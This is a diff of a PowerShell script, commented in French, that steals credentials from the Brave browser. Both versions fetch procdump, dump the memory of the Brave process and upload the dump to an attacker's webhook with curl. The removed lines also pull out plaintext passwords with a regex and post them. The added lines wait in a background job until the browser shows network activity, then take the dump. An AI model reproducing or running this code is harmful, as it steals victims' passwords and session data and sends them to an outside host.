@@ -5,75 +5,66 @@ function Send {
     Invoke-RestMethod -Uri $wh -Method Post -Body (@{content=$m}|ConvertTo-Json) -ContentType "application/json"|Out-Null
 }
 
-Send "🔓 Brave v20 bypass - Memory dump method..."
+Send "🎯 Brave v20 bypass - Waiting for user activity..."
 
-# IMPORTANT: NE PAS TUER BRAVE
-if (!(Get-Process brave -EA 0)) {
-    Send "⚠️ Brave not running - starting it..."
-    Start-Process "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\Application\brave.exe"
-    Start-Sleep 10
-}
-
-cd $env:TEMP
-
-# Télécharger procdump (outil Microsoft officiel)
-[Net.ServicePointManager]::SecurityProtocol='Tls12'
-
-try {
-    Send "📥 Downloading Procdump..."
-    Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "pd.zip" -UseBasicParsing
-    Expand-Archive "pd.zip" "pd" -Force
+# Créer un hook sur les processus Brave
+$job = Start-Job -ScriptBlock {
+    param($webhook)
     
-    # Dump mémoire du processus Brave
-    Send "💾 Creating memory dump..."
-    
-    $braveProc = Get-Process brave | Select -First 1
-    
-    .\pd\procdump64.exe -accepteula -ma $braveProc.Id brave_dump.dmp 2>$null
-    
-    Start-Sleep 3
-    
-    if (Test-Path "brave_dump.dmp") {
-        $size = (Get-Item "brave_dump.dmp").Length / 1MB
-        Send "✅ Dump created: $([math]::Round($size,2)) MB"
-        
-        # Chercher les mots de passe en clair dans le dump
-        Send "🔍 Searching for passwords in memory..."
-        
-        $dumpContent = [System.IO.File]::ReadAllText("brave_dump.dmp", [System.Text.Encoding]::ASCII)
-        
-        # Chercher des patterns de mots de passe
-        $passwords = @()
-        
-        # Pattern : entre guillemets, 6+ caractères
-        if ($dumpContent -match '"password":"([^"]{6,})"') {
-            $passwords += $Matches[1]
-        }
-        
-        # Compresser et envoyer le dump
-        Compress-Archive "brave_dump.dmp" "dump.zip" -Force
-        
-        Send "📤 Uploading memory dump..."
-        curl.exe -F "file=@dump.zip" $wh
-        
-        Remove-Item "brave_dump.dmp","dump.zip" -Force
-        
-        if ($passwords) {
-            Send "🔑 Found passwords in memory:"
-            foreach ($p in $passwords) {
-                Send $p
-            }
-        } else {
-            Send "⚠️ No plaintext passwords in dump - manual analysis needed"
-        }
-    } else {
-        Send "❌ Dump creation failed"
+    function Send-Hook {
+        param([string]$msg)
+        Invoke-RestMethod -Uri $webhook -Method Post -Body (@{content=$msg}|ConvertTo-Json) -ContentType "application/json"|Out-Null
     }
     
-    Remove-Item "pd.zip","pd" -Recurse -Force
+    # Attendre que Brave soit lancé
+    while (!(Get-Process brave -EA 0)) {
+        Start-Sleep 5
+    }
     
-} catch {
-    Send "❌ Error: $($_.Exception.Message)"
-}
+    Send-Hook "✅ Brave detected running"
+    
+    # Monitorer l'activité réseau de Brave pour détecter les connexions
+    $lastCount = 0
+    
+    for ($i=0; $i -lt 120; $i++) {
+        Start-Sleep 5
+        
+        $connections = Get-NetTCPConnection | Where-Object {$_.OwningProcess -in (Get-Process brave).Id}
+        $newCount = $connections.Count
+        
+        if ($newCount -gt $lastCount) {
+            Send-Hook "🌐 Network activity detected ($newCount connections)"
+            
+            # Dump mémoire maintenant
+            cd $env:TEMP
+            
+            Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "pd.zip" -UseBasicParsing
+            Expand-Archive "pd.zip" "pd" -Force
+            
+            $braveProc = Get-Process brave | Select -First 1
+            .\pd\procdump64.exe -accepteula -ma $braveProc.Id dump.dmp 2>$null
+            
+            if (Test-Path "dump.dmp") {
+                Compress-Archive "dump.dmp" "dump.zip" -Force
+                curl.exe -F "file=@dump.zip" $webhook
+                Send-Hook "📤 Memory dump uploaded"
+                Remove-Item dump.dmp,dump.zip -Force
+            }
+            
+            Remove-Item pd,pd.zip -Recurse -Force
+            break
+        }
+        
+        $lastCount = $newCount
+    }
+    
+} -ArgumentList $wh
 
-Send "🏁 Done"
+Send "⏳ Background job started - monitoring for 10 minutes..."
+
+# Attendre 10 minutes
+Wait-Job $job -Timeout 600
+
+Remove-Job $job -Force
+
+Send "🏁 Monitoring stopped"
